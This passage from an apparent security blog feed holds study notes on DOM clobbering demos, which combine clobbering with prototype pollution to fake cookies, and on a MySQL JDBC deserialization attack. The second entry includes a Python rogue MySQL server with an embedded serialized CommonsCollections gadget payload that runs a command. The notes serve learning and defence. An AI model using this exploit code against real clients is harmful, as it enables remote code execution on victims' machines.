src="/2023/10/13/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A88-DOM-Clobbering%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/2.png" alt><br>可以看到可以通过name属性来获取到值，当然还有其他的<br><img src="/2023/10/13/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A88-DOM-Clobbering%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/3.png" alt><br>通过<code>config.config</code>可以获取到第一个，<code>config.apiUrl</code>可以获取到第二个，接下来的操作就和上一节一样了</p></li></ol><p>覆盖三层的话就可以把两个<code>&lt;a&gt;</code>改为<code>&lt;form&gt;</code><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!<span class="variable constant_">DOCTYPE</span> html&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;config&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;config&quot;</span> <span class="attr">name</span>=<span class="string">&quot;prod&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;apiUrl&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="variable language_">console</span>.<span class="title function_">log</span>(config.<span class="property">prod</span>.<span class="property">apiUrl</span>.<span class="property">value</span>) <span class="comment">//123</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p><h1 id="更多层的DOM-Clobbering"><a href="#更多层的DOM-Clobbering" class="headerlink" title="更多层的DOM Clobbering"></a>更多层的DOM Clobbering</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">&quot;config&quot;</span> <span class="attr">srcdoc</span>=<span class="string">&#x27;</span></span></span><br><span class="line"><span class="string"><span class="tag">    &lt;a id=&quot;apiUrl&quot;&gt;&lt;/a&gt;</span></span></span><br><span class="line"><span class="string"><span class="tag">  &#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">console</span>.<span class="title function_">log</span>(config.<span class="property">apiUrl</span>) <span class="comment">// &lt;a id=&quot;apiUrl&quot;&gt;&lt;/a&gt;</span></span></span><br><span class="line"><span class="language-javascript">    &#125;, <span class="number">500</span>)</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>可以通过iframe创建更多的层级，用<code>setTimeout</code>是因为并不是同步加载的<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">&quot;moreLevel&quot;</span> <span class="attr">srcdoc</span>=<span class="string">&#x27;</span></span></span><br><span class="line"><span class="string"><span class="tag">    &lt;form id=&quot;config&quot;&gt;&lt;/form&gt;</span></span></span><br><span class="line"><span class="string"><span class="tag">    &lt;form id=&quot;config&quot; name=&quot;prod&quot;&gt;</span></span></span><br><span class="line"><span class="string"><span class="tag">      &lt;input name=&quot;apiUrl&quot; value=&quot;123&quot; /&gt;</span></span></span><br><span class="line"><span class="string"><span class="tag">    &lt;/form&gt;</span></span></span><br><span class="line"><span class="string"><span class="tag">  &#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">console</span>.<span class="title function_">log</span>(moreLevel.<span class="property">config</span>.<span class="property">prod</span>.<span class="property">apiUrl</span>.<span class="property">value</span>) <span class="comment">//123</span></span></span><br><span class="line"><span class="language-javascript">    &#125;, <span class="number">500</span>)</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p><h1 id="拓展攻击面"><a href="#拓展攻击面" class="headerlink" title="拓展攻击面"></a>拓展攻击面</h1><p>前面几节的攻击手法都是攻击<code>window</code>下面的变量，但是他有几个标签属性可以影响到<code>document</code><br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">img</span> <span class="attr">name</span>=<span class="string">cookie</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">test</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span> <span class="attr">name</span>=<span class="string">lastElementChild</span>&gt;</span>I am first child<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>I am last child<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">embed</span> <span class="attr">name</span>=<span class="string">getElementById</span>&gt;</span><span class="tag">&lt;/<span class="name">embed</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>) <span class="comment">// &lt;img name=&quot;cookie&quot;&gt;</span></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#test&#x27;</span>).<span class="property">lastElementChild</span>) <span class="comment">// &lt;div&gt;I am last child&lt;/div&gt;</span></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">document</span>.<span class="property">getElementById</span>) <span class="comment">// &lt;embed name=getElementById&gt;&lt;/embed&gt;</span></span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><br>与原型链污染搭配一起使用，就可以达到污染cookie的效果<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">img</span> <span class="attr">name</span>=<span class="string">cookie</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 先假設我們可以 pollute 成 function</span></span></span><br><span class="line"><span class="language-javascript">    <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">toString</span> = <span class="function">() =&gt;</span> <span class="string">&#x27;a=1&#x27;</span></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`cookie: <span class="subst">$&#123;<span class="variable language_">document</span>.cookie&#125;</span>`</span>) <span class="comment">// cookie: a=1</span></span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>先把cookie给改成html元素，然后原型链污染<br><code>Object.prototype.toString = () =&gt; &#39;a=1&#39;</code><br>是匿名函数的使用，让 <code>toString</code> 返回字符串 <code>a=1</code></p><p>DOMPurify中的代码就会过滤这种情况<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// https://github.com/cure53/DOMPurify/blob/d5060b309b5942fc5698070fbce83a781d31b8e9/src/purify.js#L1102</span></span><br><span class="line"><span class="keyword">const</span> _isValidAttribute = <span class="keyword">function</span> (<span class="params">lcTag, lcName, value</span>) &#123;</span><br><span class="line">  <span class="comment">/* Make sure attribute cannot clobber */</span></span><br><span class="line">  <span class="keyword">if</span> (</span><br><span class="line">    <span class="variable constant_">SANITIZE_DOM</span> &amp;&amp;</span><br><span class="line">    (lcName === <span class="string">&#x27;id&#x27;</span> || lcName === <span class="string">&#x27;name&#x27;</span>) &amp;&amp;</span><br><span class="line">    (value <span class="keyword">in</span> <span class="variable language_">document</span> || value <span class="keyword">in</span> formElement)</span><br><span class="line">  ) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>如果你的<code>name</code>或<code>id</code>存在于document中，就会直接返回false</p><p>Sanitizer API 就不会帮你做这方面的防护</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;在这一章的攻击手法是通过改变DOM，然后js会对DOM进行操作造成的漏洞，干解释还是太干燥了，还是上代码吧&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://aszx87410.github.io/beyond-xss/ch3/dom-clobbering/&quot;&gt;https://aszx87410.github.io/beyond-xss/ch3/dom-clobbering/&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</summary>
    
    
    
    <category term="前端安全" scheme="https://kaikaix.github.io/categories/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="javascript" scheme="https://kaikaix.github.io/tags/javascript/"/>
    
    <category term="xss" scheme="https://kaikaix.github.io/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>用codeql分析JDBC反序列化</title>
    <link href="https://kaikaix.github.io/2023/10/07/%E7%94%A8codeql%E5%88%86%E6%9E%90JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://kaikaix.github.io/2023/10/07/%E7%94%A8codeql%E5%88%86%E6%9E%90JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2023-10-07T09:18:15.000Z</published>
    <updated>2023-10-13T10:25:07.379Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>网上大部分都是直接分析JDBC的过程，我这里就不赘述了，这里说一下用codeql分析的思路<br><span id="more"></span></p><h1 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h1><p>pom.xml<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.0.19<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><br>加载完pom以后调试的时候会显示download source，这时候就可以把源码下下来了，然后去repository里面找到源码</p><p><a href="https://github.com/waderwu/extractor-java">https://github.com/waderwu/extractor-java</a></p><p>用该项目去生成database</p><p>java代码</p><div class="spoiler collapsed">    <div class="spoiler-title">        点击显/隐内容    </div>    <div class="spoiler-content">        <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.DriverManager;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello world!&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">ClassName</span> <span class="operator">=</span> <span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">JDBC_Url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://127.0.0.1:3307/test?&quot;</span>+</span><br><span class="line">                <span class="string">&quot;autoDeserialize=true&quot;</span>+</span><br><span class="line">                <span class="string">&quot;&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> <span class="string">&quot;root&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="string">&quot;root&quot;</span>;</span><br><span class="line">        Class.forName(<span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);</span><br><span class="line">        <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> DriverManager.getConnection(JDBC_Url, username, password);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>    </div></div><p>python的恶意服务器，记得自己用ysoserial生成payload<br><div class="spoiler collapsed">    <div class="spoiler-title">        点击显/隐内容    </div>    <div class="spoiler-content">        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*-coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">greeting_data=<span class="string">&quot;4a0000000a352e372e31390008000000463b452623342c2d00fff7080200ff811500000000000000000000032851553e5c23502c51366a006d7973716c5f6e61746976655f70617373776f726400&quot;</span></span><br><span class="line">response_ok_data=<span class="string">&quot;0700000200000002000000&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">receive_data</span>(<span class="params">conn</span>):</span><br><span class="line">    data = conn.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Receiveing the package : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(data))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(data).lower()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_data</span>(<span class="params">conn,data</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Sending the package : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(data))</span><br><span class="line">    conn.send(binascii.a2b_hex(data))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_payload_content</span>():</span><br><span class="line">    <span class="comment">#file文件的内容使用ysoserial生成的 使用规则：java -jar ysoserial [Gadget] [command] &gt; payload</span></span><br><span class="line">    file= <span class="string">r&#x27;payload&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> os.path.isfile(file):</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            payload_content = <span class="built_in">str</span>(binascii.b2a_hex(f.read()),encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;open successs&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;open false&quot;</span>)</span><br><span class="line">        <span class="comment">#calc</span></span><br><span class="line">        payload_content=<span class="string">&#x27;aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001b00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001b7371007e00137571007e001800000002707571007e001800000000740006696e766f6b657571007e001b00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00187371007e0013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000463616c63740004657865637571007e001b0000000171007e00207371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> payload_content</span><br><span class="line"></span><br><span class="line"><span class="comment"># 主要逻辑</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        conn, addr = sk.accept()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Connection come from &#123;&#125;:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(addr[<span class="number">0</span>],addr[<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 1.先发送第一个 问候报文</span></span><br><span class="line">        send_data(conn,greeting_data)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="comment"># 登录认证过程模拟  1.客户端发送request login报文 2.服务端响应response_ok</span></span><br><span class="line">            receive_data(conn)</span><br><span class="line">            send_data(conn,response_ok_data)</span><br><span class="line"></span><br><span class="line">            <span class="comment">#其他过程</span></span><br><span class="line">            data=receive_data(conn)</span><br><span class="line">            <span class="comment">#查询一些配置信息,其中会发送自己的 版本号</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;session.auto_increment_increment&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                _payload=<span 